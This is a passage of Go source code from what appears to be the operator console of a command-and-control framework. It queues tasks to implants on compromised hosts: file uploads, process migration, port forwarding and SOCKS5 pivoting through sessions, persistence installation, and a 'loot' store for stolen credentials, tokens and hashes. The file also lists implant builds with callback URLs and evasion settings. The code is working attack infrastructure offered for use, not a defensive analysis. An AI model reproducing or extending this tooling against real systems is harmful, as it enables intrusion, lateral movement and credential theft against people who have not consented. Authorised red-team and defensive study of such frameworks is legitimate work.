		ID:   fmt.Sprintf("task-%d", time.Now().UnixNano()),
		Type: "upload",
		Command: remotePath,
		Parameters: map[string]interface{}{
			"session_id": sessionID,
			"data":       string(data),
		},
	}
	is.server.EnqueueTask(task)
	fmt.Printf("[+] Queued upload: %s -> %s\n", localPath, remotePath)
}

func (is *InteractiveServer) migrateProcess(sessionID string, pid int) {
	if is.server == nil {
		fmt.Println("[!] Server not initialized")
		return
	}
	
	task := &tasks.Task{
		ID:   fmt.Sprintf("task-%d", time.Now().UnixNano()),
		Type: "migrate",
		Command: fmt.Sprintf("%d", pid),
		Parameters: map[string]interface{}{
			"session_id": sessionID,
			"pid":        pid,
		},
	}
	is.server.EnqueueTask(task)
	fmt.Printf("[+] Queued process migration to PID %d\n", pid)
}

func (is *InteractiveServer) executeFilesystemOp(sessionID, op string, path string, args ...string) {
	if is.server == nil {
		fmt.Println("[!] Server not initialized")
		return
	}
	
	task := &tasks.Task{
		ID:   fmt.Sprintf("task-%d", time.Now().UnixNano()),
		Type: "filesystem",
		Command: op,
		Parameters: map[string]interface{}{
			"session_id": sessionID,
			"path":       path,
			"args":       args,
		},
	}
	is.server.EnqueueTask(task)
	fmt.Printf("[+] Queued %s operation: %s\n", op, path)
}

func (is *InteractiveServer) handlePortForward(args []string) error {
	// Check if we have enough args - need at least 2 (local and remote)
	// If session is already set, we can use it; otherwise need 3 args
	if is.currentSession == "" && len(args) < 3 {
		fmt.Println("[!] Usage: port-forward <session_id> <local_addr> <remote_addr>")
		fmt.Println("    Example: port-forward sess-123 127.0.0.1:8080 192.168.1.100:3389")
		return nil
	}

	if len(args) < 2 {
		fmt.Println("[!] Usage: port-forward <session_id> <local_addr> <remote_addr>")
		fmt.Println("    Or: port-forward <local_addr> <remote_addr> (if session is already set)")
		return nil
	}

	var sessionID, localAddr, remoteAddr string
	
	if is.currentSession != "" {
		// Use current session
		sessionID = is.currentSession
		if len(args) >= 2 {
			localAddr = args[0]
			remoteAddr = args[1]
		} else {
			return fmt.Errorf("need local and remote addresses")
		}
	} else {
		// Session ID provided in args
		if len(args) >= 3 {
			sessionID = args[0]
			localAddr = args[1]
			remoteAddr = args[2]
		} else {
			return fmt.Errorf("need session_id, local_addr, and remote_addr")
		}
	}

	// Validate addresses
	if err := validateAddress(localAddr); err != nil {
		return fmt.Errorf("invalid local address '%s': %w\n"+
			"  Expected format: <host>:<port>\n"+
			"  Examples: 127.0.0.1:8080, 0.0.0.0:9000\n"+
			"  Note: Port must be between 1 and 65535", localAddr, err)
	}
	if err := validateAddress(remoteAddr); err != nil {
		return fmt.Errorf("invalid remote address '%s': %w\n"+
			"  Expected format: <host>:<port>\n"+
			"  Examples: 192.168.1.100:3389, 10.0.0.5:22\n"+
			"  Note: Port must be between 1 and 65535", remoteAddr, err)
	}

	pf, err := is.pivotManager.AddPortForward(sessionID, remoteAddr, localAddr)
	if err != nil {
		return fmt.Errorf("failed to create port forward: %w", err)
	}

	ctx := context.Background()
	if err := pf.Start(ctx, func(conn net.Conn) {
		// Forward connection through session
		// Create a task to establish remote connection on implant side
		task := &tasks.Task{
			ID:   fmt.Sprintf("task-%d", time.Now().UnixNano()),
			Type: "portforward",
			Command: remoteAddr,
			Parameters: map[string]interface{}{
				"session_id": sessionID,
				"local_addr": localAddr,
				"remote_addr": remoteAddr,
				"conn_id": fmt.Sprintf("conn-%d", time.Now().UnixNano()),
			},
		}
		is.server.EnqueueTask(task)
		
		is.logger.Info("Port forward connection from %s - task queued for session %s", conn.RemoteAddr(), sessionID)
		// Connection will be handled by implant when it receives the task
		// Close local connection as implant will handle forwarding
		conn.Close()
	}); err != nil {
		return fmt.Errorf("failed to start port forward: %w", err)
	}

	fmt.Printf("[+] Port forward created (ID: %d)\n", pf.ID)
	fmt.Printf("    Local: %s -> Remote: %s\n", localAddr, remoteAddr)
	return nil
}

func (is *InteractiveServer) handleSOCKS5(args []string) error {
	// Check if we have enough args
	if is.currentSession == "" && len(args) < 2 {
		fmt.Println("[!] Usage: socks5 <session_id> <bind_addr> [username] [password]")
		fmt.Println("    Example: socks5 sess-123 127.0.0.1:1080")
		return nil
	}

	if len(args) < 1 {
		fmt.Println("[!] Usage: socks5 <session_id> <bind_addr> [username] [password]")
		fmt.Println("    Or: socks5 <bind_addr> [username] [password] (if session is already set)")
		return nil
	}

	var sessionID, bindAddr, username, password string
	
	if is.currentSession != "" {
		// Use current session
		sessionID = is.currentSession
		bindAddr = args[0]
		if len(args) >= 2 {
			username = args[1]
		}
		if len(args) >= 3 {
			password = args[2]
		}
	} else {
		// Session ID provided in args
		if len(args) >= 2 {
			sessionID = args[0]
			bindAddr = args[1]
			if len(args) >= 3 {
				username = args[2]
			}
			if len(args) >= 4 {
				password = args[3]
			}
		} else {
			return fmt.Errorf("need session_id and bind_addr")
		}
	}

	// Validate bind address
	if err := validateAddress(bindAddr); err != nil {
		return fmt.Errorf("invalid bind address '%s': %w\n"+
			"  Expected format: <host>:<port>\n"+
			"  Examples: 127.0.0.1:1080, 0.0.0.0:9050\n"+
			"  Note: Port must be between 1 and 65535", bindAddr, err)
	}

	proxy, err := is.socksManager.AddSOCKS5(sessionID, bindAddr, username, password)
	if err != nil {
		return fmt.Errorf("failed to create SOCKS5 proxy: %w", err)
	}

	ctx := context.Background()
	if err := proxy.Start(ctx, func(conn net.Conn) {
		// Handle SOCKS5 protocol through session
		// Create a task to establish SOCKS5 proxy on implant side
		task := &tasks.Task{
			ID:   fmt.Sprintf("task-%d", time.Now().UnixNano()),
			Type: "socks5",
			Command: bindAddr,
			Parameters: map[string]interface{}{
				"session_id": sessionID,
				"bind_addr":  bindAddr,
				"username":   username,
				"password":   password,
				"conn_id":    fmt.Sprintf("conn-%d", time.Now().UnixNano()),
			},
		}
		is.server.EnqueueTask(task)
		
		is.logger.Info("SOCKS5 connection from %s - task queued for session %s", conn.RemoteAddr(), sessionID)
		// Connection will be handled by implant when it receives the task
		// Close local connection as implant will handle proxying
		conn.Close()
	}); err != nil {
		return fmt.Errorf("failed to start SOCKS5 proxy: %w", err)
	}

	fmt.Printf("[+] SOCKS5 proxy started (ID: %d) on %s\n", proxy.ID, bindAddr)
	return nil
}

func (is *InteractiveServer) handleLoot(args []string) error {
	if len(args) == 0 {
		return is.printLoot()
	}

	switch args[0] {
	case "list", "ls":
		return is.printLoot()
	case "add":
		if len(args) < 3 {
			fmt.Println("[!] Usage: loot add <type> <name> <data>")
			fmt.Println("    Types: credential, file, token, hash")
			return nil
		}
		lootType := loot.LootType(args[1])
		name := args[2]
		data := []byte(strings.Join(args[3:], " "))
		if len(args) == 3 {
			data = []byte(name)
		}
		id, err := is.lootManager.AddLoot(lootType, name, data, nil)
		if err != nil {
			return err
		}
		fmt.Printf("[+] Added loot: %s\n", id)
	case "get":
		if len(args) < 2 {
			fmt.Println("[!] Usage: loot get <id>")
			return nil
		}
		item, err := is.lootManager.GetLoot(args[1])
		if err != nil {
			return err
		}
		data, err := is.lootManager.DecryptLoot(item)
		if err != nil {
			return err
		}
		fmt.Printf("[+] Loot %s:\n", item.ID)
		fmt.Printf("    Type: %s\n", item.Type)
		fmt.Printf("    Name: %s\n", item.Name)
		fmt.Printf("    Data: %s\n", string(data))
	case "remove", "rm":
		if len(args) < 2 {
			fmt.Println("[!] Usage: loot remove <id>")
			return nil
		}
		if err := is.lootManager.RemoveLoot(args[1]); err != nil {
			return err
		}
		fmt.Printf("[+] Removed loot: %s\n", args[1])
	case "export":
		data, err := is.lootManager.Export()
		if err != nil {
			return err
		}
		fmt.Println(string(data))
	default:
		fmt.Println("[!] Usage: loot [list|add|get|remove|export]")
	}

	return nil
}

func (is *InteractiveServer) printLoot() error {
	items := is.lootManager.ListLoot()
	if len(items) == 0 {
		fmt.Println("[*] No loot items")
		return nil
	}

	t := table.NewWriter()
	t.SetStyle(table.StyleColoredBright)
	t.AppendHeader(table.Row{"ID", "Type", "Name", "Created"})

	for _, item := range items {
		t.AppendRow(table.Row{
			shortID(item.ID),
			item.Type,
			item.Name,
			item.CreatedAt.Format("2006-01-02 15:04:05"),
		})
	}

	fmt.Println(t.Render())
	return nil
}

func (is *InteractiveServer) handlePersistence(args []string) error {
	if len(args) < 2 {
		fmt.Println("[!] Usage: persist <action> <session_id> [options]")
		fmt.Println("    Actions: install, remove")
		fmt.Println("    Example: persist install sess-123")
		return nil
	}

	action := args[0]
	sessionID := args[1]

	if is.currentSession != "" && len(args) == 1 {
		sessionID = is.currentSession
		action = args[0]
	}

	if !is.isServerRunning() || is.server == nil {
		return fmt.Errorf("server not running")
	}

	switch action {
	case "install":
		// Queue persistence installation task
		task := &tasks.Task{
			ID:   fmt.Sprintf("task-%d", time.Now().UnixNano()),
			Type: "persist",
			Command: "install",
			Parameters: map[string]interface{}{
				"session_id": sessionID,
			},
		}
		is.server.EnqueueTask(task)
		fmt.Printf("[+] Queued persistence installation for session %s\n", shortID(sessionID))
	case "remove":
		task := &tasks.Task{
			ID:   fmt.Sprintf("task-%d", time.Now().UnixNano()),
			Type: "persist",
			Command: "remove",
			Parameters: map[string]interface{}{
				"session_id": sessionID,
			},
		}
		is.server.EnqueueTask(task)
		fmt.Printf("[+] Queued persistence removal for session %s\n", shortID(sessionID))
	default:
		return fmt.Errorf("unknown action: %s", action)
	}

	return nil
}

func (is *InteractiveServer) handleImplants(args []string) error {
	builds, err := database.GetImplantBuilds()
	if err != nil {
		return fmt.Errorf("failed to retrieve implants: %w", err)
	}

	if len(builds) == 0 {
		fmt.Println("[*] No saved implants")
		return nil
	}

	t := table.NewWriter()
	t.SetStyle(table.StyleColoredBright)
	t.AppendHeader(table.Row{"ID", "Name", "Type", "OS", "Arch", "Size", "Created"})

	for _, build := range builds {
		t.AppendRow(table.Row{
			shortID(build.ID),
			build.Name,
			build.Type,
			build.OS,
			build.Arch,
			fmt.Sprintf("%d bytes", build.Size),
			time.Unix(build.CreatedAt, 0).Format("2006-01-02 15:04:05"),
		})
	}

	fmt.Println(t.Render())
	return nil
}

func (is *InteractiveServer) handleGetImplant(args []string) error {
	if len(args) == 0 {
		fmt.Println("[!] Usage: implant <id>")
		fmt.Println("    Use 'implants' to list implant IDs")
		return nil
	}

	build, err := database.GetImplantBuildByID(args[0])
	if err != nil {
		return fmt.Errorf("failed to retrieve implant: %w", err)
	}

	fmt.Printf("[+] Implant Build Details:\n")
	fmt.Printf("    ID: %s\n", build.ID)
	fmt.Printf("    Name: %s\n", build.Name)
	fmt.Printf("    Type: %s\n", build.Type)
	fmt.Printf("    OS: %s\n", build.OS)
	fmt.Printf("    Arch: %s\n", build.Arch)
	fmt.Printf("    Callback URL: %s\n", build.CallbackURL)
	fmt.Printf("    Delay: %d seconds\n", build.Delay)
	fmt.Printf("    Jitter: %.2f\n", build.Jitter)
	fmt.Printf("    User-Agent: %s\n", build.UserAgent)
	fmt.Printf("    Protocol: %s\n", build.Protocol)
	fmt.Printf("    Output Path: %s\n", build.OutputPath)
	fmt.Printf("    Size: %d bytes\n", build.Size)
	fmt.Printf("    Created: %s\n", time.Unix(build.CreatedAt, 0).Format("2006-01-02 15:04:05"))
	if build.Modules != "" {
		fmt.Printf("    Modules: %s\n", build.Modules)
	}
	if build.Evasion != "" {
		fmt.Printf("    Evasion: %s\n", build.Evasion)
	}

	return nil
}

func (is *InteractiveServer) isServerRunning() bool {
	is.serverMu.RLock()
	defer is.serverMu.RUnlock()
	return is.serverRunning
}

func (is *InteractiveServer) setServerRunning(running bool) {
	is.serverMu.Lock()
	defer is.serverMu.Unlock()
	is.serverRunning = running
}

func shortID(id string) string {
	parts := strings.Split(id, "-")
	if len(parts) > 0 {
		if len(parts[0]) > 8 {
			return parts[0][:8]
		}
		return parts[0]
	}
	if len(id) > 8 {
		return id[:8]
	}
	return id
}

// validateCallbackURL validates that a callback URL is in a valid format
func validateCallbackURL(url string) error {
	if url == "" {
		return fmt.Errorf("callback URL cannot be empty")
	}
	
	// Check if URL has protocol
	if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
		// If no protocol, assume http:// (will be auto-added in generator)
		url = "http://" + url
	}
	
	// Try to parse as URL
	// We'll do basic validation since net/url might be too strict for our use case
	// Allow formats like: http://host:port, https://host:port, http://host, https://host
	parts := strings.Split(strings.TrimPrefix(strings.TrimPrefix(url, "http://"), "https://"), "/")
	if len(parts) == 0 {
		return fmt.Errorf("invalid URL format\n"+
			"  Expected format: <protocol>://<host>[:<port>]\n"+
			"  Valid protocols: http, https\n"+
			"  Examples: http://192.168.1.100:8443, https://example.com:443")
	}
	
	hostPort := parts[0]
	if hostPort == "" {
		return fmt.Errorf("host cannot be empty\n"+
			"  Expected format: <protocol>://<host>[:<port>]\n"+
			"  Valid protocols: http, https\n"+
			"  Examples: http://192.168.1.100:8443, https://example.com")
	}
	
	// Validate host:port format if port is present
	if strings.Contains(hostPort, ":") {
		host, port, err := net.SplitHostPort(hostPort)
		if err != nil {
			return fmt.Errorf("invalid host:port format: %w", err)
		}
		if host == "" {
			return fmt.Errorf("host cannot be empty")
		}
		if port == "" {
			return fmt.Errorf("port cannot be empty")
		}
		portNum, err := strconv.Atoi(port)
		if err != nil {
			return fmt.Errorf("port must be a number: %w", err)
		}
		if portNum < 1 || portNum > 65535 {
			return fmt.Errorf("port must be between 1 and 65535, got %d", portNum)
		}
	}
	
	return nil
}

// validateAddress validates that an address is in the format host:port
func validateAddress(addr string) error {
	host, port, err := net.SplitHostPort(addr)
	if err != nil {
		return fmt.Errorf("invalid address format: %w\n"+
			"  Expected format: <host>:<port>\n"+
			"  Examples: 0.0.0.0:8443, 127.0.0.1:8080\n"+
			"  Note: Port is required and must be between 1 and 65535", err)
	}
	
	if host == "" {
		return fmt.Errorf("host cannot be empty")
	}
	
	if port == "" {
		return fmt.Errorf("port cannot be empty")
	}
	
	// Validate port is a number
	portNum, err := strconv.Atoi(port)
	if err != nil {
		return fmt.Errorf("port must be a number: %w", err)
	}
	
	if portNum < 1 || portNum > 65535 {
		return fmt.Errorf("port must be between 1 and 65535, got %d", portNum)
	}
	
	return nil
}

// syncSessions periodically syncs sessions from the server
func (is *InteractiveServer) syncSessions() {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	
	for range ticker.C {
		if !is.isServerRunning() || is.server == nil {
			continue
		}
		
		// Sync sessions from server to session manager
		serverSessions := is.server.GetSessions()
		for id, serverSession := range serverSessions {
			// Check if session exists
			if existingSession, exists := is.sessionMgr.GetSession(id); exists {
				// Update existing session metadata
				existingSession.UpdateLastSeen()
				
				// Copy metadata from server session
				if serverSession.Metadata != nil {
					for key, value := range serverSession.Metadata {
						existingSession.SetMetadata(key, value)
					}
				}
				
				// Update RemoteAddr if changed
				if serverSession.RemoteAddr != "" && existingSession.RemoteAddr != serverSession.RemoteAddr {
					// Note: RemoteAddr isn't directly settable, but we can update via metadata
					existingSession.SetMetadata("remote_addr", serverSession.RemoteAddr)
				}
			} else {
				// Create new session in manager with full metadata
				sessionType := core.SessionTypeBeacon
				if upgraded, ok := serverSession.Metadata["upgraded"].(bool); ok && upgraded {
					sessionType = core.SessionTypeInteractive
				}
				
				transport := "http"
				if t, ok := serverSession.Metadata["transport"].(string); ok {
					transport = t
				}
				
				session := core.NewSession(id, sessionType, transport)
				
				// Copy metadata from server session
				if serverSession.Metadata != nil {
					for key, value := range serverSession.Metadata {
						session.SetMetadata(key, value)
					}
				}
				
				// Store remote address in metadata (since RemoteAddr isn't directly settable)
				if serverSession.RemoteAddr != "" {
					session.SetMetadata("remote_addr", serverSession.RemoteAddr)
				}
				
				is.sessionMgr.AddSession(session)
				
				// Trigger reaction manager for new session
				is.reactionMgr.TriggerEvent(reactions.EventTypeSessionNew, map[string]interface{}{
					"session_id": id,
					"type":        string(sessionType),
					"transport":    transport,
				})
			}
		}
	}
}

